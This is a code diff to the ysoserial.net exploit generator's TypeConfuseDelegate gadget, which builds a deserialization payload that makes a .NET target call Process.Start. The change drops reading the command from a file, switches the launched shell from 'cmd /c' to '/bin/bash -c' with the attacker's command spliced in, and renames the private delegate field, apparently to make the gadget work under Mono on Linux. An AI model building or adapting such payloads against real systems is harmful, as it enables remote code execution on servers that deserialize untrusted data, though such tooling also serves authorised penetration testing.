@@ -31,19 +31,14 @@ namespace ysoserial.Generators
         /* this can be used easily by the plugins as well */
         public object TypeConfuseDelegateGadget(string cmd)
         {
-            if (File.Exists(cmd))
-            {
-                Console.Error.WriteLine("Reading command from file " + cmd + " ...");
-                cmd = File.ReadAllText(cmd);
-            }
             Delegate da = new Comparison<string>(String.Compare);
             Comparison<string> d = (Comparison<string>)MulticastDelegate.Combine(da, da);
             IComparer<string> comp = Comparer<string>.Create(d);
             SortedSet<string> set = new SortedSet<string>(comp);
-            set.Add("cmd");
-            set.Add("/c " + cmd);
+            set.Add("/bin/bash");
+            set.Add(" -c '" + cmd + "'");
 
-            FieldInfo fi = typeof(MulticastDelegate).GetField("_invocationList", BindingFlags.NonPublic | BindingFlags.Instance);
+            FieldInfo fi = typeof(MulticastDelegate).GetField("delegates", BindingFlags.NonPublic | BindingFlags.Instance);
             object[] invoke_list = d.GetInvocationList();
             // Modify the invocation list to add Process::Start(string, string)
             invoke_list[0] = new Func<string, string, Process>(Process.Start);
